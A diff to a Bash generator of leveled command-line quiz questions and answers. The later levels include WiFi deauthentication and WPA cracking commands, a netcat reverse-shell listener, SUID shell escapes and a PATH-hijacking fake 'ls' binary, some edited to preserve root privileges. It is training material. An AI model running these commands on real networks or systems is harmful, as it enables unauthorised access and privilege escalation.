@@ -706,7 +706,7 @@ REPLACE_OLD=(foo old debug localhost http TODO FIXME tmp
   dev staging test alpha beta v1 deprecated warn error secret)
 REPLACE_NEW=(bar new prod 10.0.0.1 https DONE RESOLVED cache
   prod production live release stable v2 current info success masked)
-SIZES=(10M 50M 100M 500M 1G 5G 10G 100K 500K 2G)
+SIZES=(10M 50M 100M 500M 1G 5G 10G 100k 500k 2G)
 TIMES=(5 15 30 60 120 180 360 720 1440 10080)
 NUMBERS=(5 10 15 20 25 30 40 50 75 100 150 200 500)
 COLUMNS=(1 2 3 4 5 6 7 8)
@@ -1157,8 +1157,17 @@ gen_level3() {
   txt=$(_pick SANDBOX_TXTS); txt2=$(_pick SANDBOX_TXTS)
   cfg=$(_pick SANDBOX_CFGS); cfg2=$(_pick SANDBOX_CFGS)
   csv=$(_pick SANDBOX_CSVS)
-  term1=$(_phrase ERROR WARN INFO GET POST); term2=$(_phrase debug error warning failed success)
-  term3=$(_phrase server database logging cache enabled redis localhost admin info daily)
+  # Match terms to file types to ensure grep always finds results
+  local _log_type="app"
+  [[ $log == server.log || $log == logs/access.log ]] && _log_type="nginx"
+  if [[ $_log_type == "nginx" ]]; then
+    term1=$(_phrase GET POST 200 404 500)
+  else
+    term1=$(_phrase ERROR WARN INFO DEBUG)
+  fi
+  term2=$(_phrase TODO Review Deploy Update Schedule)
+  # Terms present in both config.ini and settings.yaml
+  term3=$(_phrase server database logging cache host port localhost info enabled)
 
   # ls | wc variants (hint at pipe since this level teaches pipes)
   questions+=("Count items in current directory (pipe ${Y}ls${C} to ${Y}wc${C})§ls | wc -l§#output:~^\\s*[0-9]+")
@@ -1492,7 +1501,7 @@ gen_level9() {
   # === COMPOUND: Advanced job control ===
   questions+=("Disown job ${n2} (detach from shell)|disown %${n2}")
   questions+=("Wait for job ${n2} specifically|wait %${n2}")
-  questions+=("Bring most recent job to foreground|fg|fg %")
+  questions+=("Bring most recent job to foreground|fg|fg %%")
   questions+=("Continue stopped job in background|bg")
 
   printf '%s\n' "${questions[@]}"
@@ -1571,7 +1580,7 @@ gen_level11() {
   questions+=("Long listing with permissions, size, date|ls -l|ls -la|eza -l")
   questions+=("List all files including hidden|ls -la|ls -al|eza -la|eza -al")
   questions+=("List sorted by size, largest first|ls -lS|ls -Sl|eza -l --sort size -r")
-  questions+=("List sorted by time, newest first|ls -lt|ls -tl|eza -l --sort modified")
+  questions+=("List sorted by time, newest first|ls -lt|ls -tl|eza -l --sort modified -r")
   questions+=("List only directories|ls -d */|eza -D")
   questions+=("Show directory tree|tree|eza -T")
   questions+=("Tree ${n3} levels deep|tree -L ${n3}|eza -T -L ${n3}")
@@ -1658,7 +1667,7 @@ gen_level14() {
   questions+=("Find lines starting with '${term}'|grep -r '^${term}'|rg '^${term}'")
   questions+=("Find lines ending with '${term}'|grep -r '${term}\$'|rg '${term}\$'")
   questions+=("Find lines containing ONLY '${term}'|grep -rx '${term}'|rg -x '${term}'")
-  questions+=("Find phone pattern XXX-XXX-XXXX|grep -E '[0-9]{3}-[0-9]{3}-[0-9]{4}'|rg '\\d{3}-\\d{3}-\\d{4}'")
+  questions+=("Find phone pattern XXX-XXX-XXXX|grep -rE '[0-9]{3}-[0-9]{3}-[0-9]{4}'|rg '\\d{3}-\\d{3}-\\d{4}'")
   questions+=("Find IP addresses in ${log}|grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log}|rg -o '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log}")
   questions+=("Find email addresses|grep -rE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}'|rg '[\\w.+-]+@[\\w.-]+\\.[a-z]{2,}'")
   questions+=("Find URLs in ${log}|grep -oE 'https?://[^ ]+' ${log}|rg -o 'https?://\\S+' ${log}")
@@ -1746,7 +1755,7 @@ gen_level15() {
 # Level 16: Data Processing
 gen_level16() {
   eval "local questions=() $_QV"; _ctx
-  local proc2=$(_pick PROCS) col2=$(_rnum 1 5) col3=$((col < 5 ? col + 1 : col)) chars=$(_rnum 10 80) thresh=$(_rnum 1 25)
+  local proc2=$(_pick PROCS) col2=$(_rnum 1 5) col3=$((col % 5 + 1)) chars=$(_rnum 10 80) thresh=$(_rnum 1 25)
   ((n > n2)) && { local t=$n; n=$n2; n2=$t; }
 
   # Sorting
@@ -1795,7 +1804,7 @@ gen_level16() {
   questions+=("Average of column 1 (skip header)|awk -F',' 'NR>1{sum+=\$1; count++} END {print sum/count}' ${csv}")
   questions+=("Maximum value in column 1|awk -F',' 'NR==2{max=\$1} NR>1 && \$1>max{max=\$1} END{print max}' ${csv}")
   questions+=("Swap columns 1 and 2 in output|awk '{print \$2, \$1}' ${txt}")
-  questions+=("Print unique values from column ${col} (skip header)|awk -F',' 'NR>1 && !seen[\$${col}]++' ${csv}")
+  questions+=("Print unique values from column ${col} (skip header)|awk -F',' 'NR>1 && !seen[\$${col}]++ {print \$${col}}' ${csv}")
   questions+=("Count records by column ${col} value|awk -F',' 'NR>1{count[\$${col}]++} END {for(k in count) print k, count[k]}' ${csv}")
 
   # Field manipulation with tr
@@ -2155,7 +2164,7 @@ gen_level24() {
   questions+=("Scan for WiFi networks|airodump-ng ${wiface}mon")
   questions+=("Capture handshake from specific AP|airodump-ng -c 6 --bssid ${mac} -w capture ${wiface}mon")
   questions+=("Send deauth packets to force handshake|aireplay-ng -0 5 -a ${mac} ${wiface}mon")
-  questions+=("Crack WPA handshake with wordlist|aircrack-ng -w ${wordlist} capture.cap")
+  questions+=("Crack WPA handshake with wordlist|aircrack-ng -w ${wordlist} capture-01.cap")
 
   # Netcat
   questions+=("Start reverse shell listener on port ${port}|nc -lvnp ${port}")
@@ -2195,8 +2204,8 @@ gen_level24() {
 
   # Wireless recon
   questions+=("Show wireless interfaces|iw dev")
-  questions+=("Scan for nearby APs|iw dev ${iface} scan|iwlist ${iface} scan")
-  questions+=("Show connected WiFi info|iw dev ${iface} link")
+  questions+=("Scan for nearby APs|iw dev ${wiface} scan|iwlist ${wiface} scan")
+  questions+=("Show connected WiFi info|iw dev ${wiface} link")
   questions+=("Set WiFi channel to 6|iw dev ${wiface}mon set channel 6")
   questions+=("Disable monitor mode|airmon-ng stop ${wiface}mon")
 
@@ -2620,7 +2629,7 @@ gen_level27() {
 
   # GTFOBins-style exploits (representative examples)
   questions+=("SUID find shell escape|find . -exec /bin/sh -p \\; -quit")
-  questions+=("SUID vim shell escape|vim -c ':!/bin/sh'")
+  questions+=("SUID vim shell escape|vim -c ':!/bin/sh -p'")
   questions+=("SUID python3 shell|python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'")
   questions+=("Sudo env privesc|sudo env /bin/sh")
 
@@ -2641,7 +2650,7 @@ gen_level27() {
   # Path hijacking
   questions+=("Check current PATH|echo \$PATH")
   questions+=("Prepend current dir to PATH|export PATH=.:\$PATH")
-  questions+=("Create malicious binary|echo '#!/bin/bash' > /tmp/ls && echo '/bin/bash' >> /tmp/ls && chmod +x /tmp/ls")
+  questions+=("Create malicious binary|echo '#!/bin/bash' > /tmp/ls && echo '/bin/bash -p' >> /tmp/ls && chmod +x /tmp/ls")
   questions+=("Exploit relative path in SUID|export PATH=/tmp:\$PATH && ./vulnerable_suid")
 
   # NFS
@@ -2785,7 +2794,7 @@ gen_level12() {
   questions+=("Show last 100 log lines|journalctl -n 100")
 
   # User/permission management
-  questions+=("Run command as root|sudo ${script}")
+  questions+=("Run ${script} as root|sudo ${script}")
   questions+=("Switch to root shell|sudo -i|su -")
   questions+=("Switch to user ${user}|su - ${user}")
   questions+=("Add user ${user}|useradd -m ${user}|sudo useradd -m ${user}")
@@ -2794,8 +2803,8 @@ gen_level12() {
   questions+=("Add ${user} to group wheel|usermod -aG wheel ${user}")
   questions+=("List groups for ${user}|groups ${user}|id ${user}")
   questions+=("Change owner of ${txt} to ${user}|chown ${user} ${txt}")
-  questions+=("Change owner and group|chown ${user}:${user} ${txt}")
-  questions+=("Change owner recursively|chown -R ${user}:${user} ${dir}/")
+  questions+=("Change owner and group of ${txt} to ${user}|chown ${user}:${user} ${txt}")
+  questions+=("Change owner of ${dir}/ recursively to ${user}|chown -R ${user}:${user} ${dir}/")
   questions+=("Show current user|whoami")
   questions+=("Show user id info|id")
 
